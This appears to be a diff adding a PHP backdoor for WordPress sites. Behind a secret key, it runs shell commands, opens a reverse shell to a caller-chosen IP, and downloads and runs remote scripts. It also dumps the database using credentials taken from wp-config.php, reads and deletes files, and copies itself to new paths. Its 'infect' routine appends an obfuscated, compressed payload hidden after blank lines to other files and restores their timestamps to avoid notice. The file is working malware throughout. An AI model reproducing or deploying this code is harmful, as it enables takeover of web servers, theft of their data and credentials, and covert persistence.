@@ -1,0 +1,356 @@
+<?php
+
+if ($_REQUEST["k"] == "INSERT_KEY") {
+    $cmd = $_REQUEST["c"];
+
+    $webroot = realpath("../") . "/";
+    $work_dir = $webroot . "wp-content/uploads/tmp/";
+    switch ($cmd) {
+
+        case "ping":
+            echo _res("pong");
+            break;
+
+        case "version":
+            echo _res("1.05");
+            break;
+
+        case "info":
+            ob_start();
+            phpinfo();
+            $data = ob_get_contents();
+            ob_clean();
+            echo _res(base64_encode($data));
+            break;
+
+        case "clear_cache":
+            if (function_exists("opcache_reset")) {
+                opcache_reset();
+            }
+            break;
+
+        case "clear_tmp":
+            removeFile($work_dir);
+            break;
+
+        case "update":
+            if (!isset($_REQUEST["url"])) {
+                echo _err("url param is required");
+                break;
+            }
+            $r = request("GET", $_REQUEST["url"]);
+            $pos = strpos($r->body, "INSERT_KEY");
+            $file = substr_replace($r->body, $_REQUEST["k"], $pos, strlen("INSERT_KEY"));
+            if (file_put_contents(__FILE__, $file)) echo _res("Updated");
+            if (function_exists("opcache_invalidate")) {
+                opcache_invalidate(__FILE__);
+            }
+            break;
+
+        case "download_script":
+            if (!isset($_REQUEST["url"])) {
+                echo _err("url param is required");
+                break;
+            }
+            $r = request("GET", $_REQUEST["url"]);
+            if (!file_exists($work_dir)) mkdir($work_dir);
+            $file_path = $work_dir;
+            $file_path .= isset($_REQUEST["name"]) ? $_REQUEST["name"] : randomStr(8);
+            $handle = fopen($file_path, "w");
+            $content = str_replace("\r", "", $r->body);
+            fputs($handle, $content);
+            fclose($handle);
+            $res = [];
+            if (isset($_REQUEST["exec"])) {
+                if ($_REQUEST["exec"] == 1) {
+                    if ($_REQUEST["lang"] == "php") {
+                        ob_start();
+                        include_once($file_path);
+                        $res["output"] = ob_get_contents();
+                        ob_clean();
+                    } elseif ($_REQUEST["lang"] == "sh") {
+                        chmod($file_path, 0755);
+                        chdir($work_dir);
+                        $output = array();
+                        exec($file_path, $output);
+                        $res["output"] = $output;
+                    }
+                }
+            }
+            $res["path"] = $file_path;
+            echo _res($res);
+            break;
+
+        case "download_file":
+            if (!isset($_REQUEST["url"])) {
+                echo _err("url param is required");
+                break;
+            }
+            if (!file_exists($work_dir)) mkdir($work_dir);
+            $file_path = $work_dir;
+            $file_path .= isset($_REQUEST["name"]) ? $_REQUEST["name"] : randomStr(8);
+            $handle = fopen($file_path, "w");
+            $r = request("GET", $_REQUEST["url"], $handle);
+            fclose($handle);
+            echo _res(["path" => $file_path]);
+            break;
+
+        case "exec":
+            if (!isset($_REQUEST["command"])) {
+                echo _err("command param is required");
+                break;
+            }
+            $command = $_REQUEST["command"];
+            $descriptorspec = array(
+                0 => array("pipe", "r"),
+                1 => array("pipe", "w"),
+                2 => array("pipe", "w"),
+            );
+            $process = proc_open($command, $descriptorspec, $pipes, dirname(__FILE__), null);
+            $stdout = stream_get_contents($pipes[1]);
+            fclose($pipes[1]);
+            $stderr = stream_get_contents($pipes[2]);
+            fclose($pipes[2]);
+            echo _res(["stdout" => $stdout, "stderr" => $stderr]);
+            break;
+
+        case "open":
+            if ($sock = fsockopen($_REQUEST["ip"], $_REQUEST["port"])) {
+                $proc = proc_open("/bin/sh -i", array( 0 => $sock, 1 => $sock, 2 => $sock), $pipes, $webroot);
+                echo _res("Socket opened to " . $_REQUEST["ip"] . ":" . $_REQUEST["port"]);
+            } else {
+                _err("Socket connection failed: " . $sock);
+            }
+            break;
+
+        case "db_dump":
+            if (!`which mysqldump`) {
+                echo _err("mysqldump doesn't exists or not allowed on host");
+                break;
+            }
+            getConfigConstants();
+            $host = DB_HOST;
+            $password = DB_PASSWORD;
+            $user = DB_USER;
+            $dbname = DB_NAME;
+            if (!file_exists($work_dir)) mkdir($work_dir);
+            $command = `mysqldump --host={$host} --user={$user} --password={$password} {$dbname}`;
+            echo _res(base64_encode($command));
+            break;
+
+        case "get_file":
+            if (!isset($_REQUEST["path"])) {
+                echo _err("path param is required");
+                break;
+            }
+            echo _res(base64_encode(file_get_contents($webroot . $_REQUEST["path"])));
+            break;
+
+        case "spread":
+            if (!isset($_REQUEST["path_list"])) {
+                echo _err("path_list param is required");
+                break;
+            }
+            $f = file_get_contents(__FILE__);
+            $res = [];
+            foreach ($_REQUEST["path_list"] as $path) {
+                $path = $webroot . $path;
+                $key = randomStr(12);
+                $file = str_replace($_REQUEST["k"], $key, $f);
+                if (file_put_contents($path, $file)) {
+                    $res[] = array("path" => $path, "key" => $key);
+                }
+            }
+            echo _res($res);
+            break;
+
+        case "infect":
+            if (!isset($_REQUEST["url"])) {
+                echo _err("url param is required");
+                break;
+            }
+            if (!isset($_REQUEST["path_list"])) {
+                echo _err("path_list param is required");
+                break;
+            }
+            $res = [];
+            foreach ($_REQUEST["path_list"] as $path) {
+                $path = $webroot . $path;
+                if (file_exists($path)) {
+                    if ($f = file_get_contents($_REQUEST["url"], false, null, 0)) {
+                        $time = filemtime($path);
+                        $key = randomStr(12);
+                        $file = str_replace("INSERT_KEY", $key, $f);
+                        $compressed = base64_encode(gzdeflate($file));
+                        $newlines = str_repeat("\n", 30);
+                        $code = <<<EOT
+                        $newlines
+                        \$ab = function(\$cd) { return strtr(\$cd, "nwaqjdzebxygsrmlhtf_cvuoikp", "abcdefghijklmnopqrstuvwxyz_"); };
+                        \$q = \$ab("zj_pqjdbrjqpdcra_bmrf");\$aa = \$q();\$a = \$aa[\$ab("br_jtrng")];
+                        foreach (\$a as \$b => \$c) {
+                            if (false !== strpos(\$c, \$ab("4pq"))) {
+                                \$d = \$a[\$b];
+                            }
+                            if (false !== strpos(\$c, \$ab("kbrd"))) {
+                                \$e = \$a[\$b];
+                            }
+                            if (false !== strpos(\$c, \$ab("_jpdc"))) {
+                                \$f = \$a[\$b];
+                            }
+                        }
+                        \$g = \$f("", \$e(\$d("$compressed")));\$g();
+EOT;
+                        if (file_put_contents($path, $code, FILE_APPEND)) {
+                            touch($path, $time);
+                            $res[] = array("path" => $path, "key" => $key);
+                        }
+                    }
+                }
+            }
+            echo _res($res);
+            break;
+
+        case "disinfect":
+            if (!isset($_REQUEST["path_list"])) {
+                echo _err("path_list param is required");
+                break;
+            }
+            $res = [];
+            foreach ($_REQUEST["path_list"] as $path) {
+                $path = $webroot . $path;
+                if (file_exists($path)) {
+                    $newlines = 30;
+                    $code_lines = 13;
+                    $time = filemtime($path);
+                    $file = file_get_contents($path);
+                    $file_lines = explode(PHP_EOL, $file);
+                    $new_file = array_slice($file_lines, 0, count($file_lines) - ($newlines + $code_lines));
+                    file_put_contents($path, implode(PHP_EOL, $new_file));
+                    touch($path, $time);
+                    $res[] = array("path" => $path);
+                } 
+                else {
+                    echo _err($path + " does not exists");
+                    break;
+                }
+            }
+            echo _res($res);
+            break;
+
+        case "remove_file":
+            if (!isset($_REQUEST["path"])) {
+                echo _err("path param is required");
+                break;
+            }
+            removeFile($webroot . $_REQUEST["path"]);
+            break;
+
+        default:
+            _err("No command specified or command is not correct");
+            break;
+    }
+}
+
+function removeFile($path)
+{
+    if (file_exists($path)) {
+        if (is_dir($path)) {
+            `rm -r $path`;
+            echo _res("Directory " . $path . " deleted");
+        } else {
+            if (unlink($path)) {
+                echo _res("File " . $path . " deleted");
+            } else {
+                echo _err("Failed deleting file: " . $path);
+            }
+        }
+    } else {
+        echo _err("File doesn't exist");
+    }
+}
+function _err($msg)
+{
+    return json_encode(["error" => 1, "msg" => $msg]);
+}
+
+function _res($content)
+{
+    return json_encode(["error" => 0, "content" => $content]);
+}
+
+function randomStr($length)
+{
+    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
+    $charactersLength = strlen($characters);
+    $randomString = '';
+    for ($i = 0; $i < $length; $i++) {
+        $randomString .= $characters[rand(0, $charactersLength - 1)];
+    }
+    return $randomString;
+}
+
+function request($requestType, $url, $outhandle = null, $parameters = null, $headers = null)
+{
+    $response = new stdClass();
+
+    if (!function_exists("curl_init")) {
+
+        $response->success = false;
+        $response->body = "cURL is not enabled.";
+
+        return $response;
+    }
+
+    $ch = curl_init();
+
+    ($parameters !== null) ? $query = http_build_query($parameters) : $query = "";
+
+    if ($requestType === "POST") {
+
+        curl_setopt($ch, CURLOPT_POST, 1);
+        curl_setopt($ch, CURLOPT_POSTFIELDS, $query);
+    } elseif ($requestType === "GET") {
+
+        if ($query) $url = $url . "?" . $query;
+    } else {
+        $response->success = false;
+        $response->body = "request type GET or POST is missing.";
+        return $response;
+    }
+
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+    curl_setopt($ch, CURLOPT_TIMEOUT, 300);
+
+    if ($headers !== null) curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
+
+    if ($outhandle !== null) curl_setopt($ch, CURLOPT_FILE, $outhandle);
+
+    $result = curl_exec($ch);
+    if ($result !== false) {
+        $response->success = true;
+        $response->body = $result;
+    } else {
+        $response->success = false;
+        $response->body = curl_error($ch);
+        $response->error = curl_errno($ch);
+    }
+    curl_close($ch);
+    return $response;
+}
+function getConfigConstants()
+{
+    $tmpfile = tempnam(sys_get_temp_dir(), "_");
+    $handle = fopen($tmpfile, "w+");
+    $config_content = file("../wp-config.php");
+    $content_size = sizeof($config_content);
+    unset($config_content[$content_size - 1]);
+    unset($config_content[$content_size - 2]);
+    fwrite($handle, implode("", $config_content));
+    fclose($handle);
+    include $tmpfile;
+    unlink($tmpfile);
+    return get_defined_vars();
+}
